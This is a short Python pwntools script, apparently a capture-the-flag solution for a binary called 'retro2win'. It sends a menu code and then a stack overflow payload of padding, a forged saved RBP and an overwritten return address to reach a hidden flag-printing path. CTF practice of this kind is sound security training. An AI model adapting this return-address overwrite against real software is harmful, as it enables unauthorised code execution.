from pwn import *

BINARY = './retro2win'
HOST = ''
GDB_SCRIPT = ''

def main():
    proc = get_process() # set is_remote = False for local testing

    payload = b''.join([
        b'A'*0x10,
        p64(0x00602800), #RBP
        p64(0x0040076a), #RIP
    ])

    proc.sendlineafter(b'Select an option:', b'1337')
    proc.sendlineafter(b'Enter your cheatcode:', payload)
    proc.recvuntil(b'FLAG: ')
    flag = proc.recvline().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()